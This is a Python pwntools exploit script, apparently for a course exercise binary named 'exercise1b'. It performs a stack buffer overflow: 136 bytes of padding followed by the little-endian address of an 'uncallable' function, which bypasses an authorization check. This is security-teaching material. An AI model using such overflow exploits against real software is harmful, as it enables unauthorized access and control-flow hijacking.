#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise1b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# gdbscript = '''
# c
# '''.format(**locals())

gdbscript = '''
b *main
b *check_authorization
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


# TODO: Overflow the buffer with the return address of the 
r = start()


# You can now communicate with the process, e.g.,

# Be careful on this, don't write something that stuck u :D
init_output = r.recvuntil("password:")
# print(init_output)
#log.info(f"Initial data receied: {init_output}"  )

exploit = b""

# # Fill the buffer
exploit += b"A" * 112

# Distance
exploit += b"B" * 24

# # Exploit the return 
# # Address of uncallable: 4011b6
# # f3 0f 1e fa  
# Little Endian
exploit+= bytearray.fromhex("b6114000")
r.sendline(exploit)

# Receive everything
#output = r.recvall()
#log.info(f"Final data receied: {output}"  )
r.recvline()
r.recvline()
result = r.recvline()
print(result)


# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()
